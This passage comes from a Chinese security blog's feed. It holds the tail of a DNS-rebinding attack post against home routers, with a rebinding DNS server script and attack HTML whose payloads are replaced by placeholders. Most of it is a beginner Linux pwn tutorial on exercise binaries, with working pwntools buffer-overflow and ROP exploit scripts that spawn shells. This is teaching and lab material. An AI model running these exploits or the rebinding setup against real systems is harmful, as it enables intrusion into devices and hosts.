<span class="title">query</span><span class="params">(self, query, timeout=None)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> defer.succeed(self._doDynamicResponse(query))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    factory = server.DNSServerFactory(</span><br><span class="line">        clients=[DynamicResolver(), client.Resolver(resolv=<span class="string">'/etc/resolv.conf'</span>)]</span><br><span class="line">    )</span><br><span class="line">    protocol = dns.DNSDatagramProtocol(controller=factory)</span><br><span class="line">    reactor.listenUDP(<span class="number">53</span>, protocol)</span><br><span class="line">    reactor.run()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">raise</span> SystemExit(main())</span><br></pre></td></tr></table></figure>

<p>代码功能:</p>
<ul>
<li>第一次DNS请求返回的IP为43.228.76.56，其余时候返回的都是路由器的IP(192.168.0.1)。</li>
</ul>
<p>剩下只需要把漏洞利用代码放到HTML中就可以了</p>
<p><strong>具体漏洞利用代码已经删除,有兴趣的可自行Google</strong></p>
<p>index.html:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"ajax.html"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ajax.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./jquery.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> xmg_01 = <span class="string">"payload1"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> xmg_02 = <span class="string">"payload2"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">foo</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> settings = &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="string">"async"</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="actionscript">            <span class="string">"crossDomain"</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="actionscript">            <span class="string">"url"</span>: <span class="string">"http://dns_rebind.smilehacker.net/"</span>,</span></span><br><span class="line"><span class="actionscript">            <span class="string">"method"</span>: <span class="string">"POST"</span>,</span></span><br><span class="line"><span class="actionscript">            <span class="string">"headers"</span>: &#123;</span></span><br><span class="line"><span class="actionscript">                <span class="string">"Content-Type"</span>: <span class="string">"application/xml"</span>,</span></span><br><span class="line"><span class="actionscript">                <span class="string">"SOAPAction"</span>: <span class="string">"vuln_address"</span>,</span></span><br><span class="line"><span class="actionscript">                <span class="string">"cache-control"</span>: <span class="string">"no-cache"</span>,</span></span><br><span class="line"><span class="actionscript">                <span class="string">"Postman-Token"</span>: <span class="string">"68b84160-c326-4b1a-a001-83b408d6435f"</span></span></span><br><span class="line">            &#125;,</span><br><span class="line"><span class="actionscript">            <span class="string">"data"</span>: <span class="string">"payload1"</span></span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"><span class="javascript">        $.ajax(settings).done(<span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.write(response);</span></span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> setting = &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="string">"async"</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="actionscript">            <span class="string">"crossDomain"</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="actionscript">            <span class="string">"url"</span>: <span class="string">"http://dns_rebind.smilehacker.net/"</span>,</span></span><br><span class="line"><span class="actionscript">            <span class="string">"method"</span>: <span class="string">"POST"</span>,</span></span><br><span class="line"><span class="actionscript">            <span class="string">"headers"</span>: &#123;</span></span><br><span class="line"><span class="actionscript">                <span class="string">"SOAPAction"</span>: <span class="string">"vuln_address"</span>,</span></span><br><span class="line"><span class="actionscript">                <span class="string">"cache-control"</span>: <span class="string">"no-cache"</span>,</span></span><br><span class="line"><span class="actionscript">                <span class="string">"Postman-Token"</span>: <span class="string">"a1a1e78d-faa1-49c6-aef9-0c54b9f3c73b"</span></span></span><br><span class="line">            &#125;,</span><br><span class="line"><span class="actionscript">            <span class="string">"data"</span>: <span class="string">"payload2"</span></span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"><span class="javascript">        $.ajax(setting).done(<span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</span></span><br><span class="line">            test();</span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.write(response);</span></span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.write(<span class="string">"test"</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">"点"</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"foo()"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="攻击展示图"><a href="#攻击展示图" class="headerlink" title="攻击展示图:"></a>攻击展示图:</h4><ul>
<li>攻击场景1:<br>此处修改了Firefox的DNS缓存时间为0,比且修改了DNS Server中域名返回外网IP的次数</li>
</ul>
<p><img src="http://file.smilehacker.net/22222222222222.gif" alt="Rebind show"></p>
<p>如果该测试放在Chrome下做，需要等待一分钟，等Chrome刷掉自己的DNS缓存</p>
<p>firefox配置:</p>
<ol>
<li>在地址栏输入<code>about:config</code></li>
<li>搜索<code>dns</code>，将network.dnsCacheExpiration、network.dnsCacheExpirationGracePeriod修改为0<br><img src="http://file.smilehacker.net/33333333333333.png" alt="firefox配置"></li>
</ol>
<ul>
<li>攻击场景2:</li>
</ul>
<p>Windows 操作系统、DNS server 为 8.8.8.8、Chrome浏览器默认配置访问<code>URL</code>链接，直接获取路由器反弹shell，等待一分钟左右<br><img src="http://file.smilehacker.net/DNS_Rebind_revershell.gif" alt="Reverse_shell"></p>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><ul>
<li><a href="https://dyn.com/blog/web-browser-dns-caching-bad-thing/" target="_blank" rel="noopener">https://dyn.com/blog/web-browser-dns-caching-bad-thing/</a></li>
<li><a href="https://blog.csdn.net/u014465934/article/details/83241097" target="_blank" rel="noopener">https://blog.csdn.net/u014465934/article/details/83241097</a></li>
<li><a href="https://blog.csdn.net/u011721501/article/details/54667714" target="_blank" rel="noopener">https://blog.csdn.net/u011721501/article/details/54667714</a></li>
</ul>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>IoT</category>
      </categories>
      <tags>
        <tag>DNSRebind</tag>
        <tag>漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux PWN</title>
    <url>/post/64819.html</url>
    <content><![CDATA[<h2 id="Linux-Pwn"><a href="#Linux-Pwn" class="headerlink" title="Linux Pwn"></a>Linux Pwn</h2><p>之前分析过一些<code>MIPS</code>平台下的二进制，对<code>Linux</code>平台下没怎么研究过。在网上看到一篇文章，写一下总结，比较基础。</p>
<p>不说原理，只说思路跟解题方法</p>
<h2 id="一"><a href="#一" class="headerlink" title="一"></a>一</h2><p>下载题目:<a href="https://github.com/smile0304/pwn_execrise/raw/master/pwn_basic_rop/pwn1" target="_blank" rel="noopener">pwn</a></p>
<p>在分析这道题目之前先使用<a href="https://github.com/slimm609/checksec.sh" target="_blank" rel="noopener"><code>checksec</code></a>查看一下该程序的保护情况:</p>
<blockquote>
<p>checksec pwn1</p>
</blockquote>
<a id="more"></a>
<p><img src="http://file.smilehacker.net/1571474474731.png" alt="checksec pwn1"></p>
<p>可以看到开启了<code>NX enabled</code>保护。使用<code>IDA</code>查看下程序的代码</p>
<p><img src="http://file.smilehacker.net/1571474770735.png" alt="IDA加载程序"></p>
<p>发现程序调用了<code>gets</code>函数，并且没有做任何的处理，可以造成了缓冲区溢出。我们需要分析<code>&amp;s</code>到<code>EBP</code>的距离，因为<code>EBP</code>后存放的就是返回地址。 在32位的程序中，就是<code>ebp+4</code>。<code>Esp -&gt; ebp</code>, 地址从小到大。小地址栈顶，大地址栈底。 </p>
<h3 id="手动计算返回地址的偏移"><a href="#手动计算返回地址的偏移" class="headerlink" title="手动计算返回地址的偏移"></a>手动计算返回地址的偏移</h3><p>工具用起来比较简单，就不介绍了，直接通过手动分析。</p>
<p>工具 :  <a href="https://github.com/desword/shellcode_tools" target="_blank" rel="noopener">patternoffset</a> </p>
<p>先使用<code>GDB</code>加载程序,在<code>call _gets</code>前下断，然后运行程序，关于<code>GDB</code>的使用参考：<a href="https://blog.pwntools.xyz/2019/10/20/GDB%E8%B0%83%E8%AF%95%E5%91%BD%E4%BB%A4-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/#more">GDB</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> disassemble main <span class="comment">#查看main函数的汇编代码</span></span></span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   .... #不删掉篇幅太长</span><br><span class="line">   0x080486ae &lt;+102&gt;:	call   0x8048460 &lt;gets@plt&gt;</span><br><span class="line">   ....</span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> b *main+102 <span class="comment">#在main函数偏移102行处下断点</span></span></span><br><span class="line"></span><br><span class="line">Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.</span><br><span class="line"></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> r <span class="comment">#运行程序</span></span></span><br></pre></td></tr></table></figure>

<p>运行结果如下:</p>
<p><img src="http://file.smilehacker.net/1571475799729.png" alt="GDB运行后栈帧的情况"></p>
<p>结合<code>IDA</code>的反编译结果计算<code>ESP</code>到<code>&amp;s</code>的偏移:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ESP = 0xffffcfa0</span><br><span class="line">EBP = 0Xffffd028</span><br><span class="line">&amp;S = ESP + 1CH = 0xffffcfbc</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &amp;s -&gt; <span class="variable">$EBP</span>的距离 offset </span></span><br><span class="line">offset = $EBP - $S = 6C[hex] = 108[DEC]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> func <span class="built_in">return</span> address</span></span><br><span class="line">return address = 108 + 4 = 112</span><br></pre></td></tr></table></figure>

<h3 id="验证结果"><a href="#验证结果" class="headerlink" title="验证结果:"></a>验证结果:</h3><p>用<code>python</code>生成一段字符，然后输入程序，看出错时结果是不是为我们指定的结果</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 在shell下执行</span></span><br><span class="line">python -c "print 'A'*112 + 'BBBB' " &gt; test</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 在GDB中执行</span></span><br><span class="line">run &lt; test</span><br></pre></td></tr></table></figure>

<p>结果如下,可以看到<code>EIP</code>已经被劫持为<code>0X424242(BBBB)</code>:</p>
<p><img src="http://file.smilehacker.net/1571476789765.png" alt="EIP已被劫持"></p>
<h3 id="EXP编写"><a href="#EXP编写" class="headerlink" title="EXP编写"></a>EXP编写</h3><p>接下来尝试在程序中寻找调用系统命令地地方,在<code>IDA</code>中按<code>ALT+T</code>搜索<code>/bin/sh</code>，正好看到有,并且调用了<code>system</code>函数</p>
<p><img src="http://file.smilehacker.net/1571476973841.png" alt="IDA搜索结果"></p>
<p><img src="http://file.smilehacker.net/1571477030249.png" alt="IDA搜索结果"></p>
<p>接下来使用<a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener"><code>pwntools</code></a>这个库来编写<code>EXP</code>:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pwn1 = process(<span class="string">'./pwn1'</span>)</span><br><span class="line">sh = <span class="number">0x804863a</span></span><br><span class="line">pwn1.sendline(<span class="string">'A'</span> * (<span class="number">112</span>) + p32(sh))</span><br><span class="line">pwn1.interactive()</span><br></pre></td></tr></table></figure>

<p>运行后成功拿到<code>shell</code>,第一关很简单.</p>
<p><img src="http://file.smilehacker.net/1571477253129.png" alt="reverse shell"></p>
<h2 id="二"><a href="#二" class="headerlink" title="二"></a>二</h2><p>下载题目:<a href="https://github.com/smile0304/pwn_execrise/raw/master/pwn_basic_rop/pwn2" target="_blank" rel="noopener">pwn2</a></p>
<p><code>cheksec</code>检查保护情况</p>
<p><img src="http://file.smilehacker.net/1571477404317.png" alt="checksec检查保护"></p>
<p><code>IDA</code>查看代码</p>
<p><img src="http://file.smilehacker.net/1571478271475.png" alt="IDA查看代码"></p>
<p>跟第一关不同的是，这里没有<code>system</code>函数给我们调用了。</p>
<h3 id="Linux系统调用"><a href="#Linux系统调用" class="headerlink" title="Linux系统调用"></a>Linux系统调用</h3><p>Linux 的系统调用通过 <code>int 80h</code>实现，用<a href="https://zh.wikipedia.org/w/index.php?title=系统调用号&action=edit&redlink=1" target="_blank" rel="noopener">系统调用号</a>来区分入口函数。操作系统实现系统调用的基本过程是：</p>
<ul>
<li><p>应用程序调用库函数<code>（API）</code>；</p>
</li>
<li><p><code>API</code> 将系统调用号存入 <code>EAX</code>，然后通过中断调用使系统进入内核态；</p>
</li>
<li><p>内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）；</p>
</li>
<li><p>系统调用完成相应功能，将返回值存入 <code>EAX</code>，返回到中断处理函数；</p>
</li>
<li><p>中断处理函数返回到<code>API</code> 中；</p>
</li>
<li><p><code>API</code> 将<code>EAX</code>返回给应用程序。</p>
<p><code>Syscall</code>的函数调用规范为： <code>execve(“/bin/sh”, 0,0)</code></p>
</li>
</ul>
<p>汇编代码如下:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pop eax,   # 系统调用号载入， execve为0xb</span><br><span class="line">pop ebx,     # 第一个参数， /bin/sh的string</span><br><span class="line">pop ecx,    # 第二个参数，0</span><br><span class="line">pop edx,   # 第三个参数，0</span><br><span class="line">int 0x80,   # 执行系统调用</span><br></pre></td></tr></table></figure>

<p>由于程序内没有<code>system</code>调用，我们需要人为的构造。</p>
<h3 id="查找ROP链"><a href="#查找ROP链" class="headerlink" title="查找ROP链"></a>查找ROP链</h3><p>使用<a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="noopener">ROPgadget</a> 查找我们需要的命令。从上面的分析可以知道我们需要对4个寄存器进行操作<code>eax</code>,<code>ebx</code>,<code>ecx</code>,<code>edx</code></p>
<p>安装好<code>ROPgadget</code>后执行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary pwn2 --only 'pop|ret' | grep "eax" </span><br><span class="line">ROPgadget --binary pwn2 --only 'pop|ret' | grep "ebx" </span><br><span class="line">ROPgadget --binary pwn2 --only 'pop|ret' | grep "ecx" </span><br><span class="line">ROPgadget --binary pwn2 --only 'pop|ret' | grep "edx" </span><br><span class="line"></span><br><span class="line">ROPgadget --binary pwn2 --only 'int'</span><br><span class="line">ROPgadget --binary pwn2 --string '/bin/sh'</span><br></pre></td></tr></table></figure>

<p>但是在执行寻找<code>ecx</code>之后发现有一条连续<code>pop ecx; pop ebx</code>的指令,我们可以直接用。当然，分开选用两条</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pop ebx; ret </span><br><span class="line">pop ecx; ret</span><br></pre></td></tr></table></figure>

<p>也是完全可以的，但是这里并没有单条<code>pop ecx; ret</code>。不过我们在下面可以用<code>0x0806eb90</code>处这条指令加深理解</p>
<p> <img src="http://file.smilehacker.net/1571496009275.png" alt="搜索结果"></p>
<p>寻找系统调用和需要执行命令的字符串</p>
<p><img src="http://file.smilehacker.net/1571497154238.png" alt="1571497154238"></p>
<p> 这里选择的每一个gadgets都含有<code>ret</code>是为了能够使得程序自动持续的选择堆栈中的指令依次执行。在构造这些gadgets之前，我们通过下面的堆栈指针移动图，来分析一下<code>eip</code>指针的移动，以及对应获取的数据内容。<code>ret</code>指令可以理解成去栈顶的数据作为下次跳转的位置。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eip = [esp];</span><br><span class="line"></span><br><span class="line">esp = esp+4;</span><br><span class="line"></span><br><span class="line"># 或者</span><br><span class="line"></span><br><span class="line">pop eip;</span><br></pre></td></tr></table></figure>

<p>此时,我们的堆栈布置如下:</p>
<p><img src="http://file.smilehacker.net/1571551902372.png" alt="堆栈结构"></p>
<p>整个堆栈的调用过程:</p>
<ol>
<li>执行<code>gets</code>函数，发生溢出，返回地址被淹没为<code>0x080bb196</code></li>
<li>跳转到<code>0x080bb196</code>执行代码，取出<code>0xb</code>并返回，栈帧下移到<code>0x0806eb91</code></li>
<li>跳转到<code>0x0806eb91</code>执行代码，取出<code>0</code>，再从<code>0x080be408</code>处取出<code>/bin/bash</code>，分别存入<code>ecx</code>,<code>edx</code>，返回,栈帧下移到<code>0x0806eb6a</code></li>
<li>跳转到<code>0x0806eb6a</code>执行代码，取出<code>0</code>存入<code>edx</code>,栈帧下移到<code>0x08049421</code>处</li>
<li>跳转到<code>0x08049421</code>执行<code>int 0x80</code>中断</li>
</ol>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./pwn2"</span>)</span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_ecx_ebx_ret = <span class="number">0x0806eb91</span></span><br><span class="line">pop_edx_ret = <span class="number">0x0806eb6a</span></span><br><span class="line">int_x80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x080be408</span></span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">	[<span class="string">'A'</span>*<span class="number">112</span>, pop_eax_ret, <span class="number">0xb</span>, pop_ecx_ebx_ret, <span class="number">0</span>, binsh, pop_edx_ret,<span class="number">0</span> ,int_x80])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>执行<code>EXP</code>，成功拿到<code>shell</code></p>
<p><img src="http://file.smilehacker.net/1571552245667.png" alt="success"></p>
<h3 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h3><p>我们用<code>0x0806eb90</code>处的指令重新布置栈帧,加深理解</p>
<p><img src="http://file.smilehacker.net/1571496009275.png" alt="搜索结果"></p>
<p>那么此时的栈帧布局就是:</p>
<p><img src="http://file.smilehacker.net/1571553359527.png" alt="此时栈帧布局"></p>
<p>写出POC：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./pwn2"</span>)</span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">pop_edx_ret = <span class="number">0x0806eb6a</span></span><br><span class="line">int_x80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x080be408</span></span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">	[<span class="string">'A'</span>*<span class="number">112</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh,int_x80])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>成功执行:</p>
<p><img src="http://file.smilehacker.net/1571553500352.png" alt="成功"></p>
<h2 id="三"><a href="#三" class="headerlink" title="三"></a>三</h2><p>下载题目:<a href="https://github.com/smile0304/pwn_execrise/raw/master/pwn_basic_rop/pwn3" target="_blank" rel="noopener">pwn</a></p>
<p><code>checksec</code>检查保护保护状态:</p>
<p><img src="http://file.smilehacker.net/1571554078794.png" alt="check检查保护状态"></p>
<p><code>IDA</code>查看汇编代码:</p>
<p><img src="http://file.smilehacker.net/1571554361586.png" alt="反编译"></p>
<p>基本跟第二道题目一样，但是我们像第二道题目一样去寻找<code>ROP</code>链的时候发现并没有找到合适的指令</p>
<p><img src="http://file.smilehacker.net/1571554491573.png" alt="寻找指令失败"></p>
<p>那也只能尝试其他的方法了,我们在<code>IDA</code>中查看下他的导入函数,发现其中有<code>system</code>函数,那我们直接调用这个函数即可</p>
<p><img src="http://file.smilehacker.net/1571554930443.png" alt="import导入函数"></p>
<p><img src="http://file.smilehacker.net/1571555353609.png" alt="SYSTEM函数调用"></p>
<p>有了<code>system</code>函数之后,用<code>ROPgadget</code>寻找一下<code>/bin/sh</code>这个字符串.</p>
<p><img src="http://file.smilehacker.net/1571555487359.png" alt="寻找/bin/sh"></p>
<h3 id="EXP编写-1"><a href="#EXP编写-1" class="headerlink" title="EXP编写"></a>EXP编写</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./pwn3"</span>)</span><br><span class="line"></span><br><span class="line">system_addr= <span class="number">0x08048460</span></span><br><span class="line">sh_addr = <span class="number">0x08048720</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">'A'</span>*<span class="number">112</span>, system_addr, <span class="number">0xabcd1122</span>, sh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>这里需要注意, 为什么在<code>system_addr</code>和<code>sh_addr</code>中间会有4字节的空余部分?</p>
<p>在正常调用system函数的时候，堆栈位置的<code>system_addr</code>之后的内容为<code>system</code>函数的返回地址，在之后才是新的堆栈的栈顶位置，因此在<code>systetem_addr</code>和<code>sh_addr</code>之间增加了4个字符来进行填充。 </p>
<h2 id="四"><a href="#四" class="headerlink" title="四"></a>四</h2><p>下载地址: <a href="https://github.com/smile0304/pwn_execrise/raw/master/pwn_basic_rop/pwn4" target="_blank" rel="noopener">pwn</a></p>
<p><code>checksec</code>检测程序保护机制</p>
<p><img src="http://file.smilehacker.net/1571556472396.png" alt="check检测"></p>
<p>还是一样的，我们再来看程序的导入表:</p>
<p><img src="http://file.smilehacker.net/1571556603660.png" alt="查看导入表"></p>
<p>发现是有<code>system</code>函数的，继续通过<code>ROPgadget</code>分析，发现没有<code>/bin/sh</code>字符串.</p>
<p><img src="http://file.smilehacker.net/1571556697767.png" alt="ROPgadgets分析"></p>
<h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>现在得想个法子。直观的想法是在<code>shellcode</code>中，在参数的位置直接放入字符串“/bin/sh”，比如下面这样： </p>
<blockquote>
<p> payload = flat([‘a’ * 112, system_plt, 0xabcdabcd, “/bin/sh”]) </p>
</blockquote>
<p>看着可行,但是放在堆栈中的是程序执行的路线图(都是通过指针调用的)，而不是实际的程序或者字符串 。而 ”/bin/sh”对应的4个字节的地址所指向的内存空间明显不合法。但是如果我们可以把<code>/bin/sh</code>塞到一个变量中，然后让<code>system</code>函数去调用他。我们就可以达到目的。可是这个变量哪里找了？我们可以去看<code>ELF</code>程序的<code>bss</code>段，<code>bss</code>段用于存放程序中未经初始化的全局变量和静态局部变量 。很巧，正好有一个。</p>
<p><img src="http://file.smilehacker.net/1571557290759.png" alt="bss段"></p>
<p>有了地址之后,一个新的问题产生,我们要怎么把<code>/bin/sh</code>塞到<code>buf2</code>这个变量中? 看看导入函数,那个<code>gets</code> :kissing_heart:</p>
<h3 id="EXP编写-2"><a href="#EXP编写-2" class="headerlink" title="EXP编写"></a>EXP编写</h3><p>下面这一段原文作者没有写，都是个人理解，有可能不对，可以看文末的链接</p>
<p>在写<code>EXP</code>之前,我们需要分析一下我们现在的栈帧应该怎么布置:</p>
<p><img src="http://file.smilehacker.net/1571558124555.png" alt="栈帧的布置"></p>
<p>看上去还行，但是又有一个新的问题,<code>gets</code>函数执行完的返回地址我们要怎么填写?程序会被这个返回地址直接带跑，直接填成<code>system</code>的地址？那参数又怎么给到system？</p>
<p>作者在这里的思路是很巧妙的<code>gets</code>函数的返回地址处存指向一条<code>pop x</code>,pop谁都可以，我们主要是利用<code>pop</code>的<code>esp+4</code>的功能。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary pwn4 --only 'pop|ret'</span><br></pre></td></tr></table></figure>

<p>用第一条第三条都可以。</p>
<p><img src="http://file.smilehacker.net/1571558379470.png" alt="ROPgadget运行结果"></p>
<p>整个运行过程如下:</p>
<ol>
<li>程序接收输入,缓冲区溢出,返回地址被淹没成<code>gets</code>函数,并从栈中获取参数</li>
<li>gets函数执行，将<code>/bin/sh</code>设置到<code>buf2</code>中，gets函数执行完成</li>
<li>程序去我们设置的<code>gets</code>函数执行完的返回地址中执行<code>pop; ret</code>指令</li>
<li><code>system</code>函数开始执行</li>
</ol>
<p>EXP：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./pwn4"</span>)</span><br><span class="line">shelf = ELF(<span class="string">"./pwn4"</span>)</span><br><span class="line"></span><br><span class="line">gets_plt = shelf.plt[<span class="string">'gets'</span>]</span><br><span class="line">system_plt = shelf.plt[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_ebp = <span class="number">0x0804872f</span></span><br><span class="line">buf2 = <span class="number">0x0804A080</span></span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">	[<span class="string">'A'</span>*<span class="number">112</span>, gets_plt, pop_ebp, buf2, system_plt, <span class="number">0xabababab</span>, buf2]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>成功获得<code>shell</code></p>
<p><img src="http://file.smilehacker.net/1571558914053.png" alt="成功"></p>
<h2 id="五"><a href="#五" class="headerlink" title="五"></a>五</h2><p>下载地址:<a href="https://github.com/smile0304/pwn_execrise/raw/master/pwn_basic_rop_2/pwn5" target="_blank" rel="noopener">pwn</a></p>
<p><code>checksec</code>检查保护情况:</p>
<p><img src="http://file.smilehacker.net/1571559117913.png" alt="checksec"></p>
<p>发现关闭了<code>NX</code>保护,也就是说可以在堆栈上执行代码了,但是开启了<code>PIE</code>保护,也就是地址随机化,而且程序也变成了64位程序。</p>
<blockquote>
<p>PS: 之前看逆向工程权威指南隐约记得传参不一样,这里刚好又出现了。</p>
